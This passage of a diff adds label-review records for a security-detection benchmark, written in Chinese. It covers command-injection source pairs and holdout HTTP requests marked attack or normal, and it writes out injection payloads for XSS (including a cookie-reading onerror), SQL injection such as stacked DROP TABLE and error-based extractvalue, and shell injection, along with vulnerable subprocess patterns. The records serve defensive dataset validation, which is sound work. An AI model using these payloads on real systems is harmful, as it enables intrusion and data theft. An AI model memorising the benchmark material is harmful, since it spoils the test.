+判断理由：两个输入都不经过 shell；命令结构固定。原标签 safe 成立，业务仍返回匹配行。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：logfile 的 ".." 仍可能残留（去掉 / 后 ".." 只是文件名），非 CWE-78
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-07-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：4123f286aa517cdd484393304ce9b8654d1b3dfe2c1dd94c868bee37f11bf7eb
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 11-12 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：POST /resize 的 JSON 字段 src、size、dst。
+输入经过的处理过程：第 11 行 args = ["convert", src, "-resize", size, dst]（此时是列表）；
+第 12 行 proc = subprocess.Popen(" ".join(args), shell=True) 把列表拼回字符串并交给 shell。
+最终输出位置或危险操作：第 12 行 shell=True 的 convert 命令。
+已有防护及其适用范围：无。列表本身不会保护，因为随后被 join 成字符串；任一字段都可注入。
+
+判断理由：src="a; id" 会执行额外命令；这是"列表最初只含常量/字段，后续被拼接"的典型。
+lines=[11,12]、anchor 在 12 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 11-12 行（构造在 11，join+执行在 12）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-07-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：b3c25ec410a61ad4a39b959506cffbaa70ed465f387621f0022c7fb6e170a699
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-07-V 的 src、size、dst。
+输入经过的处理过程：第 11 行同样的 args 列表；第 12 行 subprocess.Popen(args)，不再 join、不再 shell。
+最终输出位置或危险操作：直接 exec convert。
+已有防护及其适用范围：argv 列表 + shell=False；三个 JSON 字段都只作为独立参数。
+
+判断理由：字段中的 shell 元字符不会被解释；列表保持为列表是关键。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：以 - 开头的 src/dst 可能被 convert 当作选项（参数注入，CWE-88 类），不影响本判定
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-08-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：920e8b01b8b6f8443d9797dec5bf9c6c07805cfd8a94721efb658e7db77ad9cb
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 11 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：GET /dns 的查询参数 name。
+输入经过的处理过程：第 11 行 return {"answer": subprocess.getoutput("nslookup " + name)}。
+最终输出位置或危险操作：第 11 行 subprocess.getoutput（内部使用 shell）。
+已有防护及其适用范围：无。getoutput 没有 shell 参数可选，固定走 shell；name 直接拼接。
+
+判断理由：name="example.com; id" 可注入；getoutput 语义上等价于 shell 命令替换。
+lines=[11,11]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 11 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-08-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/cmdi.bundle.txt
+样例 SHA256：9ee26389da242ea8f94ed156f20ce3ad17d6047533907cb7ce72f7556f9ed31c
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-08-V 的查询参数（此处改名为 ip）。
+输入经过的处理过程：第 12 行 try: address = ipaddress.ip_address(request.args.get("ip",""))
+except ValueError: abort(400)；第 15 行 subprocess.getoutput("nslookup " + str(address))。
+最终输出位置或危险操作：仍是 getoutput + shell，但参数是规范化后的 IP 对象。
+已有防护及其适用范围：ipaddress 严格解析 IPv4/IPv6；str(address) 只含数字、点、十六进制字母和冒号，
+不含 shell 元字符或空白。适用于"保留 shell 但限制字符集"的实现。
+
+判断理由：能通过解析的字符串不可能包含 ; | $() 反引号或空格，注入不可行；非法输入 400。
+原标签 safe 成立。注意本安全对照把查询参数名从 name 改成 ip，接口契约与 V 不同，
+作为"修复建议"时需要保留原参数名，但这不影响 safe 判定。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+待确认问题：参数名变化属业务契约差异，建议在修复对照中说明
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+====================================================================
+七、原保留集 HTTP 请求（samples/holdout/http/requests.bundle.txt，36 条）
+====================================================================
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-05-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：7b9140fbe70572f6e423bcd856c1667698863abc9b219f380dfaf80eb2a57782
+原标签：attack
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：GET /blog/<path> 的路径段（bundle 第 6 行请求行）
+
+主审结论：agree
+
+输入来源：路径段，原文 /blog/%3Csvg%20onload%3Dalert(1)%3E。
+输入经过的处理过程：URL 一次解码，得到 <svg onload=alert(1)>。
+最终输出位置或危险操作：无源码；该请求携带的 XSS 特征位于路径段。
+已有防护及其适用范围：不适用（离线请求样本，未访问任何服务端）。
+
+判断理由：解码后是完整的 SVG 事件处理器标签，属反射型 XSS 攻击特征；与该族
+location=path_segment、technique=svg_onload 的设计一致。请求含特征不等于服务端存在漏洞，
+本标签只声明攻击特征。
+建议标签：保持 attack
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持路径段 /blog/... 与 anchor %3Csvg%20onload
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-05-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：064806b4f993c5685e5d1df35de6db8e1cad266fbdd47a1c4ae75daa71df3e25
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：GET /blog/2026-11-05-release-notes 的路径段（第 11 行）
+
+主审结论：agree
+
+输入来源：路径段，普通发布日期 slug。
+输入经过的处理过程：URL 一次解码后仍是字母、数字、连字符。
+最终输出位置或危险操作：无源码；正常博客路由样本。
+已有防护及其适用范围：不适用。
+
+判断理由：不含标签、事件处理器或编码绕过，只是普通 slug；作为路径段的正常对照成立。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-06-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：6eafa4f880f37c81289693890bd88f698a75c5e0bbcaf2d92953c605b39dd104
+原标签：attack
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：请求头 Referer（bundle 第 18 行）
+
+主审结论：agree
+
+输入来源：Referer 请求头。
+输入经过的处理过程：无编码，原样为
+https://partner.example.test/"><img src=x onerror=alert(document.cookie)>
+最终输出位置或危险操作：无源码；XSS 特征位于 Referer 头值。
+已有防护及其适用范围：不适用。
+
+判断理由：先用 "> 闭合可能的属性/标签上下文，再注入 img onerror，是典型的 Referer 反射 XSS 载荷；
+与 location=header_referer、technique=img_onerror 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持 Referer 头（第 18 行）与 anchor onerror=alert(document.cookie)
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-06-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：9fb4ac72bac474032b4e26ee85b2b400ded6ca35744de8ffc8cc4ffc1be5dde4
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：请求头 Referer（第 24 行）
+
+主审结论：agree
+
+输入来源：Referer 请求头。
+输入经过的处理过程：无编码，https://partner.example.test/docs/getting-started?ref=nav。
+最终输出位置或危险操作：无源码；普通来源页 URL。
+已有防护及其适用范围：不适用。
+
+判断理由：只有正常 URL 字符（协议、主机、路径、查询参数），不含引号/标签/事件处理器，
+作为"普通 Referer"对照成立。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-07-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：94a30f58c06d4cd8a3ae2b9b24a5b6e780258fe4e2095aa5ed8c9401a37b154c
+原标签：attack
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：POST /api/widgets 的 JSON 嵌套字段 widget.style.color（第 32 行请求体）
+
+主审结论：agree
+
+输入来源：JSON 体 widget.style.color。
+输入经过的处理过程：JSON 解析（无 URL 编码），得到 red" autofocus onfocus="alert(1)。
+最终输出位置或危险操作：无源码；XSS 特征位于嵌套 JSON 值。
+已有防护及其适用范围：不适用。
+
+判断理由：值内用引号闭合可能的属性上下文，再注入 autofocus/onfocus 事件处理器；JSON 只是传输层，
+服务端若把该值写入 HTML 属性即形成 XSS。与 location=json_nested、technique=attribute_breakout 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持 JSON 字段 widget.style.color 与 anchor autofocus onfocus=
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-07-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：c5197ecd542f64ab70d887ec8e68773dc08f489999672c4977d097fe1505630c
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：POST /api/widgets 的 JSON 体（第 39 行）
+
+主审结论：agree
+
+输入来源：JSON 体 widget.title、widget.style.color。
+输入经过的处理过程：JSON 解析；title = The "Q3" sales chart（JSON 内转义引号），color = #c0392b。
+最终输出位置或危险操作：无源码；普通图表配置。
+已有防护及其适用范围：不适用。
+
+判断理由：引号只是普通文本中的引号，没有属性闭合结构或事件处理器；颜色是十六进制值。
+作为"文本中含引号"的正常对照成立。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-08-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：a7ae67045dc8e2567ccacfeeed393e263aa67d11a2ccdad64f2332291c191ef0
+原标签：attack
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：GET /search 的查询参数 q（第 42 行）
+
+主审结论：agree
+
+输入来源：查询参数 q。
+输入经过的处理过程：URL 一次解码，得到 <ScRiPt>alert(origin)</sCrIpT>。
+最终输出位置或危险操作：无源码；XSS 特征位于 q。
+已有防护及其适用范围：不适用。
+
+判断理由：大小写混合的 script 标签仍是合法 HTML，浏览器按 script 执行；用于测试基于关键字大小写的
+检测规则。与 technique=mixed_case_tag 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持 q 参数与 anchor %3CScRiPt%3E
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-08-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：c5836ac611f6364b38e9a92704f30e1fd0c88ae91bb11df144980b249167dbe5
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：GET /search 的查询参数 q（第 47 行）
+
+主审结论：agree
+
+输入来源：查询参数 q。
+输入经过的处理过程：URL 一次解码，得到 for x in range(10): print(x)。
+最终输出位置或危险操作：无源码；普通代码片段搜索。
+已有防护及其适用范围：不适用。
+
+判断理由：只含括号、冒号、空格等，没有 < > 标签结构或事件处理器；搜索代码片段是正常业务。
+作为"特殊符号/代码片段但非攻击"的对照成立。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-09-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：9d11e1e864041817568f7050166f99076a13377f52241b3c9a7bddec5f689038
+原标签：attack
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：POST /posts 的表单字段 body（第 56 行请求体）
+
+主审结论：agree
+
+输入来源：application/x-www-form-urlencoded 的 body 字段。
+输入经过的处理过程：URL 一次解码，得到
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>。
+最终输出位置或危险操作：无源码；XSS 特征位于 body 字段。
+已有防护及其适用范围：不适用。
+
+判断理由：srcdoc 的值是 HTML 文档，实体 &lt;script&gt; 在 srcdoc 内会被解码为 <script>，
+从而在 iframe 中执行；这是 iframe srcdoc 注入。与 technique=iframe_srcdoc 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持 body 字段与 anchor %3Ciframe+srcdoc
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-09-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：db54e8bc805ee1919c1529441d3e14ae262cfdfcb73bb8c13274adee5f784246
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：POST /posts 的表单字段 title/body（第 63 行请求体）
+
+主审结论：agree
+
+输入来源：表单字段 title、body。
+输入经过的处理过程：URL 解码后是 "Embedding videos" 与
+"Use the iframe embed code from the video page."。
+最终输出位置或危险操作：无源码；普通论坛发帖内容。
+已有防护及其适用范围：不适用。
+
+判断理由：提到 iframe 这个词，但没有 <、> 或 srcdoc 结构，不构成注入；作为"同主题词但正常"的
+对照成立（normal_counterpart=iframe_word）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-10-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：79121b937fde8a99bd7ffef7e23af477d22d04a614ec3981dd71a441d341f462
+原标签：attack
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：GET /out 的查询参数 to（第 66 行）
+
+主审结论：agree
+
+输入来源：查询参数 to。
+输入经过的处理过程：URL 一次解码，得到
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==；
+data URI 的 base64 部分解码后为 <script>alert(1)</script>。
+最终输出位置或危险操作：无源码；XSS 特征位于跳转参数 to。
+已有防护及其适用范围：不适用。
+
+判断理由：data:text/html 是一个可执行 HTML 文档的 URI，base64 内容确认是 script；若服务端把它写入
+跳转/链接，会形成 XSS（或开放重定向到脚本页）。与 technique=data_uri_html 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持 to 参数与 anchor data%3Atext%2Fhtml
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：若只在 Location 头使用，也可能构成开放重定向（CWE-601）；本样本按 XSS 载荷记录，可接受
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-10-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：02600e437a191d787451a262de5d6b3cd25ed5c077d52e2adce1e2663641d834
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：GET /out 的查询参数 to（第 71 行）
+
+主审结论：agree
+
+输入来源：查询参数 to。
+输入经过的处理过程：URL 一次解码，得到 https://docs.example.test/guide。
+最终输出位置或危险操作：无源码；普通 https 跳转目标。
+已有防护及其适用范围：不适用。
+
+判断理由：绝对 https URL，无 data:/javascript: 方案，无脚本内容；作为"普通跳转"对照成立
+（normal_counterpart=absolute_https_redirect）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-05-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：1ddd89f8a9cb7800179505ca0cb0ebe04e7403959808423bd31762e5c6122df6
+原标签：attack
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：GET /orders 的查询参数 id（第 76 行）
+
+主审结论：agree
+
+输入来源：查询参数 id。
+输入经过的处理过程：URL 一次解码，得到 7; DROP TABLE orders--。
+最终输出位置或危险操作：无源码；SQL 攻击特征位于 id。
+已有防护及其适用范围：不适用（离线请求样本）。
+
+判断理由：分号堆叠 DROP 语句，是堆叠查询注入的明确特征；与 technique=stacked_query 一致。
+需要说明的是，多数驱动默认禁止多语句，该请求成功与否取决于服务端，但"请求含攻击特征"成立。
+建议标签：保持 attack
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持 id 参数与 anchor DROP%20TABLE
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-05-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：15aab9500a37ac251069c196514ddbc4d765e81e654874adcf1ae084d85814fe
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：GET /notes 的查询参数 q（第 81 行）
+
+主审结论：agree
+
+输入来源：查询参数 q。
+输入经过的处理过程：URL 解码（+ 为空格），得到 milk; eggs; bread。
+最终输出位置或危险操作：无源码；普通购物清单文本。
+已有防护及其适用范围：不适用。
+
+判断理由：分号只用于分隔日常文本，后面不是 SQL 语句；没有引号闭合、注释、UNION 等结构。
+作为"含分号但正常"的对照成立（normal_counterpart=semicolon_in_text）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：正常对照与攻击样本不在同一端点/参数（/notes?q= 对 /orders?id=），
+但请求级检测只看内容，不影响该样本作为正常对照
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-06-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：9697e27374388e2a98b5dadbf1ca8427c7bc313b1cdae1c33ca910c89e2c90f6
+原标签：attack
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：POST /login 的表单字段 username（第 90 行请求体）
+
+主审结论：agree
+
+输入来源：application/x-www-form-urlencoded 的 username。
+输入经过的处理过程：URL 解码，得到 admin'--（password=anything）。
+最终输出位置或危险操作：无源码；SQL 特征位于 username。
+已有防护及其适用范围：不适用。
+
+判断理由：单引号闭合后接 -- 注释，用于截断密码条件，是登录处注释截断注入的标准形态；
+与 technique=comment_truncation 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持 username 字段与 anchor admin%27--
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-06-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：b5976a8927d4a0bbe647b540dd317d4d89c9f77c7b673ff66829a196675dfaed
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：POST /login 的 password 字段（第 97 行请求体）
+
+主审结论：agree
+
+输入来源：password 字段。
+输入经过的处理过程：URL 解码，得到 Lake--Shore-77。
+最终输出位置或危险操作：无源码；普通密码文本。
+已有防护及其适用范围：不适用。
+
+判断理由：包含 "--" 但只是密码中的连字符，没有引号闭合或 SQL 结构；作为"双连字符文本"的正常对照
+成立（normal_counterpart=double_dash_text）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-07-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：b328ab668bc2b26dca58c9cc914b42b45d7f639a936e6204aec9ba1fa33d2525
+原标签：attack
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：POST /api/accounts/balance 的 JSON 字段 account_id（第 104 行请求体）
+
+主审结论：agree
+
+输入来源：JSON 体 account_id。
+输入经过的处理过程：JSON 解析，得到 1 OR 1=1。
+最终输出位置或危险操作：无源码；SQL 特征位于 account_id。
+已有防护及其适用范围：不适用。
+
+判断理由：若服务端把该字符串放入未加引号的数值上下文，1 OR 1=1 会恒真；即使 JSON 层是字符串，
+进入 SQL 后仍可能是数值位置，属"未加引号恒真"载荷（technique=unquoted_tautology）。
+建议标签：保持 attack
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持 account_id 字段与 anchor 1 OR 1=1
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：可利用性取决于服务端是否加引号；标签只声明请求含攻击特征
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-07-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：21b45859e918f7f6f661078bb86344c345f3df43be5d713707db91279815ba63
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：POST /api/accounts/balance 的 JSON 体（第 111 行）
+
+主审结论：agree
+
+输入来源：JSON 体 account_id、memo。
+输入经过的处理过程：JSON 解析；account_id=1042，memo="split 3 = 1 + 2 between us"。
+最终输出位置或危险操作：无源码；普通数字与说明文本。
+已有防护及其适用范围：不适用。
+
+判断理由：memo 中的 =、数字、加号只是自然语言；account_id 是纯数字。没有 OR/UNION/注释结构。
+作为"数值表达式文本"的正常对照成立（normal_counterpart=numeric_expression_text）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-08-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：443b80370e14f598e63733376e63762425e14743db669c1222b65f3878fedb9b
+原标签：attack
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：GET /products 的查询参数 sort（第 114 行）
+
+主审结论：agree
+
+输入来源：查询参数 sort。
+输入经过的处理过程：URL 一次解码，得到
+(SELECT CASE WHEN (1=1) THEN price ELSE name END)。
+最终输出位置或危险操作：无源码；SQL 特征位于 sort（ORDER BY 位置）。
+已有防护及其适用范围：不适用。
+
+判断理由：在 ORDER BY 中放入子查询/CASE 表达式，是排序参数注入的典型技巧，可用于布尔盲注；
+与 technique=order_by_subquery 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持 sort 参数与 anchor (SELECT%20CASE
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-08-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：bc9129f267ff4469a1379c1cfc233a4e0181af476058eff1eb243e47630934aa
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：GET /products 的查询参数 sort（第 119 行）
+
+主审结论：agree
+
+输入来源：查询参数 sort。
+输入经过的处理过程：URL 解码，得到 price,-created_at。
+最终输出位置或危险操作：无源码；普通多列排序。
+已有防护及其适用范围：不适用。
+
+判断理由：逗号和减号只表示多列排序/降序，没有括号、子查询或 SQL 关键字组合。
+作为"多列排序"的正常对照成立（normal_counterpart=multi_column_sort）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-09-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：afb2da6089d8b73891e0b29b1cb46326858f7b6ddcdb1a57870a8304c6976745
+原标签：attack
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：请求头 X-Forwarded-For（第 126 行）
+
+主审结论：agree
+
+输入来源：X-Forwarded-For 请求头。
+输入经过的处理过程：无编码，原样为
+1' AND extractvalue(1,concat(0x7e,version()))-- -
+最终输出位置或危险操作：无源码；SQL 特征位于该头值。
+已有防护及其适用范围：不适用。
+
+判断理由：单引号闭合 + AND + extractvalue 报错函数 + 注释收尾，是 MySQL 报错注入的标准形态；
+与 technique=error_based 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持 X-Forwarded-For 头与 anchor extractvalue(1,concat(0x7e
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-09-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：85912223f0c319a86e262405ab5cf8c52d94daba00ebadae84a44b1293fe9d9c
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：请求头 X-Forwarded-For（第 132 行）
+
+主审结论：agree
+
+输入来源：X-Forwarded-For 请求头。
+输入经过的处理过程：无编码，203.0.113.7, 198.51.100.2（均为文档用 IP 段）。
+最终输出位置或危险操作：无源码；普通转发链 IP 列表。
+已有防护及其适用范围：不适用。
+
